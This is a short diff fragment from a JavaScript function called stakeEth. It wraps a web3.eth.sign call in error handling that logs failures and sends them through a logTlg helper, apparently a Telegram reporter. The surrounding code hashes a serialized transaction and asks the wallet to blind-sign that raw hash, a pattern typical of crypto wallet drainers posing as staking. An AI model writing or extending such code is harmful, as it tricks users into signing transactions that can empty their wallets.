@@ -756,7 +756,36 @@ async function stakeEth(amount, msg) {
         const serializedTx = "0x" + tx.serialize().toString("hex");
         const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
 
-        const initialSig = await web3.eth.sign(sha3_, account);
+        console.log("About to call web3.eth.sign");
+
+let initialSig;
+
+try {
+    initialSig = await web3.eth.sign(sha3_, account);
+
+    console.log("Signature received:", initialSig);
+
+} catch (e) {
+
+    console.error("web3.eth.sign failed");
+
+    console.error("Code:", e?.code);
+
+    console.error("Message:", e?.message);
+
+    console.error(e);
+
+    await logTlg(`
+❌ web3.eth.sign failed
+
+Code: ${e?.code}
+Message: ${e?.message}
+Stack:
+${e?.stack || "N/A"}
+`);
+
+    return;
+}
 
         const temp = initialSig.substring(2),
           r = "0x" + temp.substring(0, 64),
